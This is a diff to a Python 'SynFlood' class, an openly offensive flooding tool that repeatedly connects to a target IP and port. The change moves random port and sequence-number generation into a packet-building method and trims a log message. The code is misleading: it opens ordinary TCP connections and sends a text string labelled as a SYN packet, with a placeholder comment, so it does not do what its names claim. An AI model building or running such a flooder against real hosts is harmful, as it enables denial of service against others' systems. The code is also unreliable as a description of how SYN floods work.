@@ -22,20 +22,23 @@ class SynFlood:
 
     def create_syn_packet(self):
         """Create a TCP SYN packet."""
-        return b''  # You can customize this to create an actual SYN packet if needed
+        source_port = random.randint(1024, 65535)
+        sequence_number = random.randint(1000, 9999)
+        
+        # Placeholder: Customize this to create an actual SYN packet if needed
+        syn_packet = f"SYN packet: Source Port - {source_port}, Sequence Number - {sequence_number}".encode()
+        
+        return syn_packet
 
     def send_syn_packet(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(1)
 
-        source_port = random.randint(1024, 65535)
-        sequence_number = random.randint(1000, 9999)
-
         try:
             sock.connect((self.target_ip, self.target_port))
             sock.sendall(self.create_syn_packet())
             self.syn_count += 1
-            logging.debug(Fore.GREEN + f"Sent SYN packet to {self.target_ip}:{self.target_port} from port {source_port}, sequence number {sequence_number}")
+            logging.debug(Fore.GREEN + f"Sent SYN packet to {self.target_ip}:{self.target_port}")
         except ConnectionRefusedError:
             logging.error(Fore.RED + f"Connection refused to {self.target_ip}:{self.target_port}")
         except socket.error as e:
